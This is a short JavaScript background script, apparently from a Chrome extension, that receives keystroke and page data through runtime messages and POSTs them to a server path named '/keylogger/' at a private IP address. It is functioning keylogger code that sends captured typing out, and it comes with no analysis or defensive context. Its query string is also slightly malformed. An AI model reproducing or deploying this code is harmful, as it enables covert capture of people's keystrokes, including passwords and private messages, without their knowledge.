function handleMessage(request){
 //alert(request.key);
 //alert(request.page);

data = "key="+request.key+"&page"+request.page;
var xhr = new XMLHttpRequest();
xhr.onload = function()
{
    //alert(this.responseText);
}
xhr.open("POST","http://192.168.14.3/keylogger/",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send(data);
}
chrome.runtime.onMessage.addListener(handleMessage);